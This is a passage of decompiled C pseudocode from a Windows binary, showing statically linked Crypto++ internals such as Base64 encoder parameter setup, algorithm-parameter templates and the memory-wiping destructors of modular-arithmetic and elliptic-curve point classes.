// 438C60: using guessed type char var_80[24];
// 438C60: using guessed type char var_98[24];
// 438C60: using guessed type char var_B0[24];
// 438C60: using guessed type char var_C8[24];

//----- (00438DD0) --------------------------------------------------------
char __thiscall sub_438DD0(void *this, void (__thiscall ***a2)(_DWORD, int))
{
  char v2; // bl

  v2 = (*(int (__thiscall **)(void *, _DWORD))(*(_DWORD *)this + 48))(this, a2);
  if ( a2 )
    (**a2)(a2, 1);
  return v2;
}

//----- (00438E30) --------------------------------------------------------
char __thiscall sub_438E30(void *this, int a2, int a3, int a4, int a5)
{
  char v6; // bl
  int v8; // [esp+10h] [ebp-10h]

  v8 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  (*(void (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 40))(this, v8, a4, a5);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v8 + 16))(v8, a2, a3);
  v6 = (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 48))(this, v8);
  (**(void (__thiscall ***)(int, int))v8)(v8, 1);
  return v6;
}

//----- (00438EB0) --------------------------------------------------------
void __thiscall sub_438EB0(_DWORD *this, size_t a2)
{
  unsigned int v3; // edi
  void *v4; // ebx
  void *v5; // eax
  size_t v6; // edx
  void *v7; // [esp+10h] [ebp-8h]

  v3 = this[2];
  v4 = (void *)this[3];
  if ( v3 != a2 )
  {
    if ( a2 )
      v5 = sub_45AEA0(a2);
    else
      v5 = 0;
    v7 = v5;
    v6 = v3;
    if ( a2 < v3 )
      v6 = a2;
    if ( v4 && v5 )
      sub_438F30(v5, v6, v4, v6);
    memset(v4, 0, v3);
    j_j___free_base(v4);
    v4 = v7;
  }
  this[2] = a2;
  this[3] = v4;
  this[1] = -1;
}

//----- (00438F30) --------------------------------------------------------
int __cdecl sub_438F30(void *a1, size_t a2, void *Src, size_t Size)
{
  if ( !Size )
    return 0;
  if ( !a1 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
  if ( Src && a2 >= Size )
  {
    memmove(a1, Src, Size);
    return 0;
  }
  memset(a1, 0, a2);
  if ( !Src )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
  if ( a2 >= Size )
    return 22;
  *_errno() = 34;
  _invalid_parameter_noinfo();
  return 34;
}

//----- (00438FD0) --------------------------------------------------------
int __thiscall sub_438FD0(int this, int a2, _BYTE *a3)
{
  char v4; // bl
  _DWORD *v5; // esi
  int v6; // eax
  void (__thiscall ***v7)(_DWORD, int); // ecx
  void (__thiscall ***v8)(_DWORD, int); // ecx
  int v10; // [esp+28h] [ebp+8h]

  v4 = *(_BYTE *)(this + 8);
  v5 = operator new(0x14u);
  if ( v5 )
  {
    v5[1] = a2;
    *((_BYTE *)v5 + 8) = v4;
    *((_BYTE *)v5 + 9) = 0;
    v5[3] = 0;
    *v5 = &CryptoPP::AlgorithmParametersTemplate<unsigned char>::`vftable';
    *((_BYTE *)v5 + 16) = *a3;
  }
  else
  {
    v5 = 0;
  }
  v6 = *(_DWORD *)(this + 4);
  *(_DWORD *)(this + 4) = 0;
  v7 = (void (__thiscall ***)(_DWORD, int))v5[3];
  v10 = v6;
  if ( v7 )
  {
    (**v7)(v7, 1);
    v6 = v10;
  }
  v5[3] = v6;
  v8 = *(void (__thiscall ****)(_DWORD, int))(this + 4);
  if ( v8 )
    (**v8)(v8, 1);
  *(_DWORD *)(this + 4) = v5;
  *(_BYTE *)(this + 8) = v4;
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BA168: using guessed type void *CryptoPP::AlgorithmParametersTemplate<unsigned char>::`vftable';

//----- (00439090) --------------------------------------------------------
_DWORD *__cdecl sub_439090(_DWORD *a1, int a2, _DWORD *a3, char a4)
{
  _DWORD *v4; // edi
  _DWORD *v6; // esi
  int v7; // eax
  void (__thiscall ***v8)(_DWORD, int); // ecx
  void (__thiscall ***v9)(_DWORD, int); // ecx
  int v11; // [esp+10h] [ebp-1Ch] BYREF
  void (__thiscall ***v12)(_DWORD, int); // [esp+14h] [ebp-18h]
  _DWORD *v13; // [esp+1Ch] [ebp-10h]
  int v14; // [esp+28h] [ebp-4h]
  int v15; // [esp+40h] [ebp+14h]

  v4 = sub_4550C0(&v11);
  v14 = 0;
  v6 = operator new(0x14u);
  v13 = v6;
  if ( v6 )
  {
    v6[1] = a2;
    *((_BYTE *)v6 + 8) = a4;
    *((_BYTE *)v6 + 9) = 0;
    v6[3] = 0;
    *v6 = &CryptoPP::AlgorithmParametersTemplate<unsigned char const *>::`vftable';
    v6[4] = *a3;
  }
  else
  {
    v6 = 0;
  }
  v13 = v6;
  v7 = v4[1];
  v4[1] = 0;
  v8 = (void (__thiscall ***)(_DWORD, int))v6[3];
  LOBYTE(v14) = 1;
  v15 = v7;
  if ( v8 )
  {
    (**v8)(v8, 1);
    v7 = v15;
  }
  v6[3] = v7;
  v9 = (void (__thiscall ***)(_DWORD, int))v4[1];
  v13 = 0;
  if ( v9 )
    (**v9)(v9, 1);
  v4[1] = v6;
  *((_BYTE *)v4 + 8) = a4;
  LOBYTE(v14) = 0;
  sub_455040(a1, (int)v4);
  v14 = 3;
  if ( v12 )
    (**v12)(v12, 1);
  return a1;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BA158: using guessed type void *CryptoPP::AlgorithmParametersTemplate<unsigned char const *>::`vftable';

//----- (00439180) --------------------------------------------------------
const char **__thiscall sub_439180(const char **this, char a2)
{
  sub_406980(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (004391A0) --------------------------------------------------------
_DWORD *__thiscall sub_4391A0(_DWORD *this, char a2)
{
  *this = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (004391D0) --------------------------------------------------------
char __thiscall sub_4391D0(unsigned int *this, void *a2, int a3, _DWORD *a4)
{
  char result; // al

  if ( __std_type_info_compare(&dword_4E9194, &dword_4EE1D8) || (result = sub_43EE60(a3, a4, this + 4)) == 0 )
  {
    sub_4059C0(a2, (int)&unsigned char `RTTI Type Descriptor', a3);
    result = *((_BYTE *)this + 16);
    *(_BYTE *)a4 = result;
  }
  return result;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4E9190: using guessed type unsigned __int8 unsigned char `RTTI Type Descriptor';
// 4E9194: using guessed type int dword_4E9194;
// 4EE1D8: using guessed type int dword_4EE1D8;

//----- (00439230) --------------------------------------------------------
char __thiscall sub_439230(unsigned int *this, void *a2, int a3, unsigned int *a4)
{
  unsigned int v5; // eax

  if ( __std_type_info_compare(&dword_4E90D4, &dword_4EE1D8) || (LOBYTE(v5) = sub_43EE60(a3, a4, this + 4), !(_BYTE)v5) )
  {
    sub_4059C0(a2, (int)&unsigned char const * `RTTI Type Descriptor', a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4E90D0: using guessed type const unsigned __int8 *unsigned char const * `RTTI Type Descriptor';
// 4E90D4: using guessed type int dword_4E90D4;
// 4EE1D8: using guessed type int dword_4EE1D8;

//----- (00439290) --------------------------------------------------------
void *sub_439290()
{
  return &unk_4B9900;
}

//----- (004392A0) --------------------------------------------------------
void __thiscall sub_4392A0(_DWORD *this, int a2)
{
  _DWORD *v3; // eax
  int v4; // eax
  int v5; // [esp+8h] [ebp-2Ch] BYREF
  void (__thiscall ***v6)(_DWORD, int); // [esp+Ch] [ebp-28h]
  int v7[3]; // [esp+14h] [ebp-20h] BYREF
  int v8; // [esp+20h] [ebp-14h] BYREF
  void *v9; // [esp+24h] [ebp-10h] BYREF
  int v10; // [esp+30h] [ebp-4h]

  v8 = 6;
  v9 = &unk_4B9900;
  v3 = sub_4227B0(&v5, (int)"DecodingLookupArray", &v9, 0);
  v10 = 0;
  v4 = sub_426740((int)v3, (int)"Log2Base", &v8, 1);
  v7[0] = (int)&CryptoPP::CombinedNameValuePairs::`vftable';
  v7[1] = a2;
  v7[2] = v4;
  LOBYTE(v10) = 1;
  sub_45B640(this, v7);
  v7[0] = (int)&CryptoPP::NameValuePairs::`vftable';
  v10 = 2;
  if ( v6 )
    (**v6)(v6, 1);
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BA104: using guessed type void *CryptoPP::CombinedNameValuePairs::`vftable';

//----- (00439360) --------------------------------------------------------
void __thiscall sub_439360(_DWORD *this, int a2)
{
  char v3; // bl
  char v4; // al
  int *v5; // esi
  int v6; // ecx
  const char *v7; // edx
  int v8; // eax
  _DWORD *v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  unsigned int v16; // ecx
  void *v17; // edx
  unsigned int v18; // ecx
  void *v19; // edx
  void **v20; // [esp+10h] [ebp-6Ch] BYREF
  void (__thiscall ***v21)(_DWORD, int); // [esp+14h] [ebp-68h]
  char v22[4]; // [esp+1Ch] [ebp-60h] BYREF
  const char *v23; // [esp+20h] [ebp-5Ch]
  unsigned int v24; // [esp+24h] [ebp-58h]
  unsigned int v25; // [esp+2Ch] [ebp-50h]
  unsigned int v26; // [esp+30h] [ebp-4Ch]
  void *v27; // [esp+34h] [ebp-48h]
  char v28[4]; // [esp+38h] [ebp-44h] BYREF
  const char *v29; // [esp+3Ch] [ebp-40h]
  unsigned int v30; // [esp+40h] [ebp-3Ch]
  unsigned int v31; // [esp+48h] [ebp-34h]
  unsigned int v32; // [esp+4Ch] [ebp-30h]
  void *Block; // [esp+50h] [ebp-2Ch]
  int v34[3]; // [esp+54h] [ebp-28h] BYREF
  int v35; // [esp+60h] [ebp-1Ch] BYREF
  int v36; // [esp+64h] [ebp-18h] BYREF
  const char *v37; // [esp+68h] [ebp-14h] BYREF
  char v38; // [esp+6Fh] [ebp-Dh] BYREF
  int v39; // [esp+78h] [ebp-4h]

  v3 = 1;
  if ( (*(unsigned __int8 (__thiscall **)(int, const char *, bool *, char *))(*(_DWORD *)a2 + 4))(
         a2,
         "InsertLineBreaks",
         &bool `RTTI Type Descriptor',
         &v38) )
  {
    v3 = v38;
  }
  v4 = (*(int (__thiscall **)(int, const char *, int *, const char **))(*(_DWORD *)a2 + 4))(
         a2,
         "MaxLineLength",
         &int `RTTI Type Descriptor',
         &v37);
  v5 = (int *)this[18];
  v6 = 72;
  v35 = 6;
  if ( v4 )
    v6 = (int)v37;
  v37 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  v7 = "\n";
  v25 = -1;
  if ( !v3 )
    v7 = (const char *)&unk_4CCC25;
  v26 = 0;
  v8 = 0;
  v27 = 0;
  if ( v3 )
    v8 = v6;
  v36 = v8;
  v24 = strlen(v7);
  v23 = v7;
  v22[0] = 0;
  v39 = 9;
  v31 = -1;
  v32 = 0;
  Block = 0;
  v29 = v7;
  v30 = v24;
  v28[0] = 0;
  v9 = sub_439090(&v20, (int)"EncodingLookupArray", &v37, 0);
  LOBYTE(v39) = 10;
  v10 = sub_438FD0((int)v9, (int)"PaddingByte", "=");
  v11 = sub_426740(v10, (int)"GroupSize", &v36, *(_BYTE *)(v10 + 8));
  v12 = sub_4265F0(v11, (int)"Separator", (int)v28, *(_BYTE *)(v11 + 8));
  v13 = sub_4265F0(v12, (int)"Terminator", (int)v22, *(_BYTE *)(v12 + 8));
  v14 = sub_426740(v13, (int)"Log2Base", &v35, 1);
  v34[0] = (int)&CryptoPP::CombinedNameValuePairs::`vftable';
  v34[1] = a2;
  v34[2] = v14;
  v15 = *v5;
  LOBYTE(v39) = 11;
  (*(void (__thiscall **)(int *, int *, int))(v15 + 44))(v5, v34, -1);
  v34[0] = (int)&CryptoPP::NameValuePairs::`vftable';
  LOBYTE(v39) = 12;
  if ( v21 )
    (**v21)(v21, 1);
  v20 = &CryptoPP::NameValuePairs::`vftable';
  v16 = v32;
  v17 = Block;
  if ( v31 < v32 )
    v16 = v31;
  LOBYTE(v39) = 13;
  memset(Block, 0, v16);
  j_j___free_base(v17);
  v18 = v26;
  v19 = v27;
  if ( v25 < v26 )
    v18 = v25;
  v39 = 14;
  memset(v27, 0, v18);
  j_j___free_base(v19);
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BA104: using guessed type void *CryptoPP::CombinedNameValuePairs::`vftable';
// 4ED864: using guessed type bool bool `RTTI Type Descriptor';
// 4EE1D4: using guessed type int int `RTTI Type Descriptor';
// 439360: using guessed type const char *var_14;
// 439360: using guessed type char var_60[4];
// 439360: using guessed type char var_44[4];

//----- (00439570) --------------------------------------------------------
char __thiscall sub_439570(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  char result; // al

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<unsigned char>::`vftable';
  result = *(_BYTE *)(this + 16);
  *(_BYTE *)(a2 + 16) = result;
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BA168: using guessed type void *CryptoPP::AlgorithmParametersTemplate<unsigned char>::`vftable';

//----- (00439610) --------------------------------------------------------
int __thiscall sub_439610(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  int result; // eax

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<unsigned char const *>::`vftable';
  result = *(_DWORD *)(this + 16);
  *(_DWORD *)(a2 + 16) = result;
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BA158: using guessed type void *CryptoPP::AlgorithmParametersTemplate<unsigned char const *>::`vftable';

//----- (004396B0) --------------------------------------------------------
_DWORD *__thiscall sub_4396B0(
        void *this,
        _DWORD *a2,
        int a3,
        int a4,
        int a5,
        unsigned int a6,
        unsigned int a7,
        void *a8,
        int a9)
{
  unsigned __int8 (__thiscall *v10)(void *, int, void *, _DWORD *); // eax
  unsigned int v11; // edx
  void *v12; // esi
  unsigned int v13; // edx
  void *v14; // esi
  unsigned int v15; // edx
  void *v16; // esi
  _DWORD v18[2]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v19; // [esp+18h] [ebp-20h]
  unsigned int v20; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v22; // [esp+28h] [ebp-10h]
  int v23; // [esp+34h] [ebp-4h]

  v22 = 0;
  v23 = 1;
  sub_43D6C0(v18);
  v10 = *(unsigned __int8 (__thiscall **)(void *, int, void *, _DWORD *))(*(_DWORD *)this + 4);
  LOBYTE(v23) = 2;
  if ( v10(this, a3, &CryptoPP::Integer `RTTI Type Descriptor', v18) )
  {
    sub_43D420(a2, v18);
    v22 = 1;
    v11 = v20;
    v12 = Block;
    if ( v19 < v20 )
      v11 = v19;
    LOBYTE(v23) = 3;
    memset(Block, 0, 4 * v11);
    if ( v11 )
      j_j_unknown_libname_61(v12);
    else
      j_j___free_base(v12);
    v23 = 4;
  }
  else
  {
    sub_43D420(a2, &a4);
    v22 = 1;
    v15 = v20;
    v16 = Block;
    if ( v19 < v20 )
      v15 = v19;
    LOBYTE(v23) = 5;
    memset(Block, 0, 4 * v15);
    if ( v15 )
      j_j_unknown_libname_61(v16);
    else
      j_j___free_base(v16);
    v23 = 6;
  }
  v13 = a7;
  v14 = a8;
  if ( a6 < a7 )
    v13 = a6;
  memset(a8, 0, 4 * v13);
  if ( v13 )
    j_j_unknown_libname_61(v14);
  else
    j_j___free_base(v14);
  return a2;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4396B0: using guessed type _DWORD var_28[2];

//----- (004397E0) --------------------------------------------------------
unsigned int __cdecl sub_4397E0(_DWORD *a1, unsigned int *a2)
{
  unsigned int v2; // ecx
  unsigned int v3; // esi
  char pExceptionObject[40]; // [esp+8h] [ebp-50h] BYREF
  _DWORD v7[10]; // [esp+30h] [ebp-28h] BYREF

  v2 = *a2;
  if ( -*a2 < *a1 )
  {
    sub_419B80((int)v7, "RoundUpToMultipleOf: integer overflow");
    v7[9] = 0;
    sub_405230(pExceptionObject, v7);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v3 = *a1 + v2 - 1;
  if ( !v2 || ((v2 - 1) & v2) != 0 )
    return v3 - v3 % v2;
  else
    return v3 - (v3 & (v2 > 1 ? v2 - 1 : 0));
}

//----- (00439890) --------------------------------------------------------
unsigned int __thiscall sub_439890(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax
  unsigned int v5; // ebx
  int v6; // ecx
  unsigned int v7; // ecx
  unsigned int v8; // edi
  unsigned int v9; // ebx
  _DWORD *v10; // edx
  _DWORD *v11; // ecx
  _DWORD *v13; // [esp-8h] [ebp-44h]
  _DWORD v14[5]; // [esp+0h] [ebp-3Ch] BYREF
  int v15; // [esp+14h] [ebp-28h]
  _DWORD *v16; // [esp+18h] [ebp-24h]
  unsigned int v17; // [esp+1Ch] [ebp-20h]
  _DWORD *v18; // [esp+20h] [ebp-1Ch]
  _DWORD *v19; // [esp+24h] [ebp-18h]
  _DWORD *v20; // [esp+28h] [ebp-14h]
  _DWORD *v21; // [esp+2Ch] [ebp-10h]
  int v22; // [esp+38h] [ebp-4h]

  v21 = v14;
  v14[4] = this;
  v4 = (this[1] - *this) >> 6;
  v5 = (unsigned int)a2 - *this;
  if ( v4 == 0x3FFFFFF )
    sub_420130();
  v6 = this[2] - *this;
  v15 = v4 + 1;
  v7 = v6 >> 6;
  if ( v7 <= 0x3FFFFFF - (v7 >> 1) )
  {
    v8 = v7 + (v7 >> 1);
    if ( v8 < v4 + 1 )
      v8 = v4 + 1;
    v17 = v8;
  }
  else
  {
    v8 = v4 + 1;
    v17 = v4 + 1;
  }
  v20 = sub_43CBA0(v8);
  v9 = v5 & 0xFFFFFFC0;
  v22 = 0;
  v16 = (_DWORD *)((char *)v20 + v9);
  v18 = (_DWORD *)((char *)v20 + v9 + 64);
  v19 = v18;
  sub_439B40((int)this, (int)v20 + v9, a3);
  v10 = (_DWORD *)this[1];
  v11 = (_DWORD *)*this;
  v19 = v16;
  if ( a2 == v10 )
  {
    sub_43CAB0(v11, v10, (int)v20);
  }
  else
  {
    sub_43C9F0(v11, a2, (int)v20);
    v13 = (_DWORD *)this[1];
    v19 = v20;
    sub_43C9F0(a2, v13, (int)v18);
  }
  sub_43C6C0(this, (int)v20, v15, v8);
  return v9 + *this;
}
// 420130: using guessed type void __noreturn sub_420130(void);

//----- (004399D0) --------------------------------------------------------
char *__thiscall sub_4399D0(int this, unsigned int a2, _DWORD *a3)
{
  int v4; // ebx
  int v5; // ecx
  unsigned int v6; // ecx
  unsigned int v7; // edx
  char *v8; // edx
  int v9; // eax
  unsigned int v10; // edi
  char *v11; // esi
  char *v12; // edi
  char *v13; // ecx
  char *v14; // esi
  int v16; // [esp+0h] [ebp-40h] BYREF
  char *v17; // [esp+10h] [ebp-30h]
  char *v18; // [esp+14h] [ebp-2Ch]
  char **v19; // [esp+18h] [ebp-28h]
  char *v20; // [esp+1Ch] [ebp-24h]
  int v21; // [esp+20h] [ebp-20h]
  char *v22; // [esp+24h] [ebp-1Ch]
  char *v23; // [esp+28h] [ebp-18h]
  char **v24; // [esp+2Ch] [ebp-14h]
  int *v25; // [esp+30h] [ebp-10h]
  int v26; // [esp+3Ch] [ebp-4h]
  char *v27; // [esp+4Ch] [ebp+Ch]

  v25 = &v16;
  v24 = (char **)this;
  v4 = a2;
  if ( a2 > 0xAAAAAAA )
    sub_420130();
  v5 = *(_DWORD *)(this + 8) - *(_DWORD *)this;
  v22 = (char *)((*(_DWORD *)(this + 4) - *(_DWORD *)this) / 24);
  v6 = v5 / 24;
  v7 = v6 >> 1;
  if ( v6 <= 178956970 - (v6 >> 1) )
  {
    v4 = v7 + v6;
    if ( v7 + v6 < a2 )
      v4 = a2;
  }
  v21 = v4;
  v8 = (char *)sub_43CC00(v4);
  v9 = (int)v22;
  v10 = a2 - (_DWORD)v22;
  v23 = v8;
  v26 = 1;
  v11 = &v8[24 * (_DWORD)v22];
  v20 = v11;
  v22 = v11;
  v17 = &v8[24 * v9];
  v18 = v17;
  v19 = v24;
  while ( v10 )
  {
    sub_43D420(v11, a3);
    v11 += 24;
    --v10;
    v18 = v11;
  }
  v12 = v23;
  v22 = v11;
  v17 = v23;
  v13 = v24[1];
  v14 = *v24;
  v27 = v13;
  v18 = v23;
  v19 = v24;
  LOBYTE(v26) = 2;
  while ( v14 != v13 )
  {
    sub_43D420(v12, v14);
    v13 = v27;
    v12 += 24;
    v18 = v12;
    v14 += 24;
  }
  return sub_43C740(v24, v23, a2, v4);
}
// 420130: using guessed type void __noreturn sub_420130(void);

//----- (00439B40) --------------------------------------------------------
int __cdecl sub_439B40(int a1, int a2, int a3)
{
  int result; // eax

  sub_43D420((_DWORD *)a2, (_DWORD *)a3);
  sub_43D420((_DWORD *)(a2 + 24), (_DWORD *)(a3 + 24));
  *(_DWORD *)(a2 + 48) = *(_DWORD *)(a3 + 48);
  *(_DWORD *)(a2 + 52) = *(_DWORD *)(a3 + 52);
  *(_DWORD *)(a2 + 56) = *(_DWORD *)(a3 + 56);
  *(_BYTE *)(a2 + 60) = *(_BYTE *)(a3 + 60);
  *(_BYTE *)(a2 + 61) = *(_BYTE *)(a3 + 61);
  *(_BYTE *)(a2 + 62) = *(_BYTE *)(a3 + 62);
  result = *(unsigned __int8 *)(a3 + 63);
  *(_BYTE *)(a2 + 63) = result;
  return result;
}

//----- (00439BD0) --------------------------------------------------------
int __fastcall sub_439BD0(int a1, int a2, int a3)
{
  void *v4; // edx

  *(_BYTE *)(a1 + 73) = 0;
  *(_DWORD *)(a1 + 80) = *(_DWORD *)(a3 + 80);
  *(_DWORD *)(a1 + 84) = *(_DWORD *)(a3 + 84);
  if ( *(_DWORD *)(a3 + 84) > 0x10u || *(_BYTE *)(a1 + 73) )
  {
    v4 = 0;
  }
  else
  {
    *(_BYTE *)(a1 + 73) = 1;
    v4 = (void *)(a1 + (-a1 & 0xF));
  }
  *(_DWORD *)(a1 + 88) = v4;
  if ( *(_DWORD *)(a3 + 88) )
    sub_438F30(v4, 4 * *(_DWORD *)(a1 + 84), *(void **)(a3 + 88), 4 * *(_DWORD *)(a3 + 84));
  return a1;
}

//----- (00439C40) --------------------------------------------------------
_DWORD *__thiscall sub_439C40(_DWORD *this, _DWORD *a2)
{
  this[1] = &CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  this[2] = this;
  *this = &CryptoPP::ModularArithmetic::`vftable';
  sub_43D420(this + 3, a2 + 3);
  sub_43D360(this + 9, 0, a2[6]);
  sub_43D6C0(this + 15);
  *this = &CryptoPP::MontgomeryRepresentation::`vftable';
  sub_43D420(this + 21, a2 + 21);
  sub_418D50(this + 27, a2 + 27);
  return this;
}
// 4BA46C: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 4BA4A4: using guessed type void *CryptoPP::ModularArithmetic::`vftable';
// 4BA514: using guessed type void *CryptoPP::MontgomeryRepresentation::`vftable';

//----- (00439DC0) --------------------------------------------------------
void __thiscall sub_439DC0(_DWORD *this)
{
  _DWORD *v2; // edi
  _DWORD *v3; // ebp
  _DWORD *v4; // esi

  v2 = (_DWORD *)*this;
  if ( *this )
  {
    v3 = (_DWORD *)this[1];
    v4 = (_DWORD *)*this;
    if ( v2 != v3 )
    {
      do
      {
        sub_43A280(v4);
        v4 += 16;
      }
      while ( v4 != v3 );
    }
    if ( ((this[2] - (_DWORD)v2) & 0xFFFFFFC0) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_46C87D(v2);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
}

//----- (00439E50) --------------------------------------------------------
void __thiscall sub_439E50(_DWORD *this)
{
  int v2; // edx
  unsigned int v3; // edx
  void *v4; // esi
  void *v5; // [esp-4h] [ebp-20h]

  *this = &CryptoPP::ECPPoint::`vftable';
  v5 = (void *)this[11];
  v2 = *(_DWORD *)((char *)this + (this[9] < this[10] ? 0xFFFFFFFC : 0) + 40);
  memset(v5, 0, 4 * v2);
  if ( v2 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  v3 = this[4];
  if ( this[3] < v3 )
    v3 = this[3];
  v4 = (void *)this[5];
  memset(v4, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v4);
  else
    j_j___free_base(v4);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BAADC: using guessed type void *CryptoPP::ECPPoint::`vftable';

//----- (00439F00) --------------------------------------------------------
void __thiscall sub_439F00(_DWORD *this)
{
  int v2; // edx
  int v3; // edx
  unsigned int v4; // edx
  void *v5; // esi
  void *v6; // [esp-4h] [ebp-20h]
  void *v7; // [esp-4h] [ebp-20h]

  *this = &CryptoPP::ModularArithmetic::`vftable';
  v6 = (void *)this[19];
  v2 = *(_DWORD *)((char *)this + (this[17] < this[18] ? 0xFFFFFFFC : 0) + 72);
  memset(v6, 0, 4 * v2);
  if ( v2 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  v7 = (void *)this[13];
  v3 = *(_DWORD *)((char *)this + (this[11] < this[12] ? 0xFFFFFFFC : 0) + 48);
  memset(v7, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v7);
  else
    j_j___free_base(v7);
  v4 = this[6];
  if ( this[5] < v4 )
    v4 = this[5];
  v5 = (void *)this[7];
  memset(v5, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BA4A4: using guessed type void *CryptoPP::ModularArithmetic::`vftable';

//----- (00439FE0) --------------------------------------------------------
void __thiscall sub_439FE0(int this)
{
  int v2; // edx
  unsigned int v3; // edx
  void *v4; // ebx
  void *v5; // [esp-4h] [ebp-20h]

  *(_DWORD *)this = &CryptoPP::MontgomeryRepresentation::`vftable';
  v5 = *(void **)(this + 120);
  v2 = *(_DWORD *)((*(_DWORD *)(this + 112) < *(_DWORD *)(this + 116) ? 0xFFFFFFFC : 0) + this + 116);
  memset(v5, 0, 4 * v2);
  if ( v2 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  v3 = *(_DWORD *)(this + 96);
  v4 = *(void **)(this + 100);
  if ( *(_DWORD *)(this + 92) < v3 )
    v3 = *(_DWORD *)(this + 92);
  memset(*(void **)(this + 100), 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v4);
  else
    j_j___free_base(v4);
  sub_439F00((_DWORD *)this);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BA514: using guessed type void *CryptoPP::MontgomeryRepresentation::`vftable';

//----- (0043A090) --------------------------------------------------------
void __thiscall sub_43A090(int this)
{
  int v2; // edx
  int v3; // edx
  unsigned int v4; // ecx
  void *v5; // edx
  void *v6; // [esp-Ch] [ebp-28h]
  void *v7; // [esp-8h] [ebp-24h]
  void *v8; // [esp-4h] [ebp-20h]
  void *v9; // [esp-4h] [ebp-20h]
  void *v10; // [esp-4h] [ebp-20h]

  v8 = *(void **)(this + 108);
  v2 = *(_DWORD *)((*(_DWORD *)(this + 100) < *(_DWORD *)(this + 104) ? 0xFFFFFFFC : 0) + this + 104);
  memset(v8, 0, 4 * v2);
  if ( v2 )
    j_j_unknown_libname_61(v8);
  else
    j_j___free_base(v8);
  v9 = *(void **)(this + 84);
  v3 = *(_DWORD *)((*(_DWORD *)(this + 76) < *(_DWORD *)(this + 80) ? 0xFFFFFFFC : 0) + this + 80);
  memset(v9, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v9);
  else
    j_j___free_base(v9);
  v10 = *(void **)(this + 64);
  memset(v10, 0, *(_DWORD *)((*(_DWORD *)(this + 56) < *(_DWORD *)(this + 60) ? 0xFFFFFFFC : 0) + this + 60));
  j_j___free_base(v10);
